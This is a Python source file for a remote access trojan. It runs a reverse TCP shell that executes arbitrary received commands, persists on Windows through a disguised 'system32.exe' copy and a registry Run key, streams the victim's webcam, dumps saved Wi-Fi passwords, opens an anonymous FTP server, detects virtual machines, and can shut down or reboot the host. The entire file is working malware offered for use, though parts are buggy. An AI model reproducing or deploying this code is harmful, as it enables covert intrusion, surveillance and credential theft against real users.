#!/usr/bin/python
import socket
import platform
import os
import sys
import psutil
import subprocess
import time
import cv2
import pickle
import struct
import threading
import shutil

from cryptography.fernet import Fernet
from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer

hardware_info = """machine type: {}
processor info: {}
disk usage: {}
number of logical cpu cores: {}
number of physical cpu cores: {}
""".format(platform.machine(),
        platform.processor(),
        psutil.disk_usage('/'),
        psutil.cpu_count(logical=True),
        psutil.cpu_count(logical=False))

def virtual_machine():
    # Check if the system is running on a virtual machine based on common indicators
    indicators = [
        'hypervisor',
        'VMware',
        'VirtualBox',
        'KVM',
        'QEMU',
        'Microsoft',
        'Xen',
        'Parallels',
    ]

    system_info = platform.system()
    for indicator in indicators:
        if indicator.lower() in system_info.lower():
            return True

    # Check for specific virtualization files on Linux
    if system_info == 'Linux':
        try:
            with open('/proc/cpucinfo', 'r') as cpuinfo_file:
                cpuinfo = cpuinfo_file.read()
                if 'hypervisor' or 'VMware' or 'VirtualBox' or\
                    'KVM' or 'QEMU' or 'Microsoft' or\
                    'Xen' or 'Parallels' in cpuinfo.lower():
                    return True
        except FileNotFoundError:
            pass

    # Check for system-specific virtualization commands
    if system_info == 'Windows':
        try:
            output = subprocess.check_output(['wmic', 'computersystem', 'get', 'manufacturer'], universal_newlines=True)
            if 'Microsoft' in output:
                return True
        except subprocess.CalledProcessError:
            pass

    return False

def shutdown():
    os = platform.system()
    if os == 'Linux':
        try:
            subprocess.run("shutdown now", shell=True)
        except:
            shutdown()

    elif os == "Windows":
        try:
            subprocess.run("shutdown", shell=True)
        except:
            shutdown()
    else:
        pass

def reboot():
    os = platform.system()
    if os == 'Linux':
        try:
            subprocess.run("reboot", shell=True)
        except:
            try:
                subprocess.run("restart", shell=True)
            except:
                shutdown()
    
    elif os == "Windows":
        try:
            subprocess.run("reboot", shell=True)
        except:
            try:
                subprocess("restart", shell=True)
            except:
                shutdown()
    else:
        pass

class Reverse_Tcp:

    def __init__(self):
        self.server_ip = "127.0.0.1"
        self.server_port = 5555
        self.target = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.ftp_host = socket.gethostbyname(socket.gethostname())
        self.ftp_port = 8000
        self.os = platform.system()
        self.format = "UTF-8"

    def connect(self):
        while True :
            try :
                self.target.connect((self.server_ip, self.server_port))
                break
            except ConnectionRefusedError:
                time.sleep(10)
            except ConnectionResetError:
                time.sleep(10)
            except ConnectionError:
                time.sleep(10)
            except Exception:
                time.sleep(10)

    @staticmethod
    def reset_connection():
        while True :
            try :
                payload = Reverse_Tcp()
                payload.connect()
                payload.open_shell()
            except ValueError:
                time.sleep(10)
            except ConnectionRefusedError:
                time.sleep(10)
            except ConnectionResetError:
                time.sleep(10)
            except ConnectionError:
                time.sleep(10)
            except Exception:
                time.sleep(10)
    
    def hide_payload(self):
        try:
            if self.os == "Windows":
                location = os.environ['appdata'] + "\\system32.exe"
                if not os.path.exists(location):
                    shutil.copyfile(sys.executable, location)
                    subprocess.call('reg add HKCU\\Softwares\\Microsoft\\Windows\\CurrentVersion\\Run /v system32 /t REG_SZ /d "' + location + '"', shell=True)
                else:
                    pass
        except:
            pass
        
    def ftp(self):
        try:
            authorizer = DummyAuthorizer()
            authorizer.add_anonymous(os.getcwd())
            handler = FTPHandler
            handler.authorizer = authorizer
            handler.banner = "pyftpdlib based ftpd ready"
            address = (self.ftp_host, self.ftp_port)
            ftp_server = FTPServer(address, handler)
            ftp_server.max_cons = 2
            ftp_server.handle_max_cons_per_ip = 5
            ftp_server.serve_forever()

            payload = Reverse_Tcp()
            shell_thread = threading.Thread(target=payload.open_shell())
            shell_thread.start()
        except:
            Reverse_Tcp.reset_connection()

    def open_shell(self):
        while True:
            command = self.target.recv(1024).decode(self.format)
            if command=="clear" or command=="cls":
                pass
            elif command == "help":
                pass
            elif command[:3] == "cd ":
                try:
                    os.chdir(command[3:])
                    self.target.send("directory changed to {}".format(command[3:]).encode(self.format))
                except FileNotFoundError:
                    self.target.send("no such file or directory: {}".format(command[3:]).encode(self.format))
                except NotADirectoryError:
                    self.target.send("{} not a directory".format(command[3:]).encode(self.format))
            elif command == "hardware --check":
                self.target.send(hardware_info.encode(self.format))
            elif command == "vm --check":
                if virtual_machine():
                    self.target.send("The system is running on a virtual machine".encode(self.format))
                else :
                    self.target.send("The system is not running on a virtual machine".encode(self.format))
            elif command == "ftp --start":
                self.target.send(f"starting ftp server on {self.ftp_host, self.ftp_port} at {time.asctime()}".encode(self.format))
                ftp_server = Reverse_Tcp()
                ftp_thread = threading.Thread(target=ftp_server.ftp)
                ftp_thread.start()
            elif command == "vc --start":
                cap = cv2.VideoCapture(0)
                while True:
                    try :
                        ret, frame = cap.read()
                        data = pickle.dumps(frame)
                        message_size = struct.pack("L", len(data))
                        self.target.sendall(message_size + data)
                    except(BrokenPipeError, ConnectionAbortedError,
                           ConnectionResetError, ConnectionRefusedError,
                           ConnectionError, InterruptedError, ValueError, Exception):
                        payload = Reverse_Tcp()
                        payload.reset_connection()
            elif command=="exit" or command=="quit" or command=="close":
                self.target.send("exit".encode(self.format))
                Reverse_Tcp.reset_connection()
            elif command == "profiles":
                if self.os == "Windows":
                    wifi_profiles = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode(self.format).split('\n')

                    profiles = [i.split(":")[1][1:-1] for i in wifi_profiles if "All User Profile" in i]

                    for i in profiles:
                        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode(self.format).split('\n')
                        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
                        try:
                            self.target.send("{:<30}|  {:<}".format(i, results[0]).encode(self.format))
                        except IndexError:
                            self.target.send("{:<30}|  {:<}".format(i, "").encode(self.format))
                        except Exception:
                            self.target.send("failed to extarct wifi passwords".encode(self.format))

                elif self.os == "Linux":
                    whoami = subprocess.check_output("whoami", shell=True)
                    if whoami == "root":
                        path = "/etc/NetworkManager/system-connections/"
                        for wifi in path:
                            passwords = subprocess.check_output('cat {}'.format(wifi), shell=True)
                        self.target.send(passwords.encode(self.format))
                    else:
                        self.target.send("permission denied".encode(self.format))
                else :
                    self.target.send("unspacified system [{}]".format(self.os).encode(self.format))
            elif command=="shutdown" or command=="power off":
                shutdown()
            elif command=='reboot' or command=='restart':
                reboot()
            else :
                try:
                    proc = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                    self.target.send(proc)
                except subprocess.CalledProcessError as error:
                    self.target.send("Error Occurred {}".format(str(error)).encode(self.format))

if __name__ == '__main__':
    payload = Reverse_Tcp()
    payload.hide_payload()
    payload.connect()
    payload.open_shell()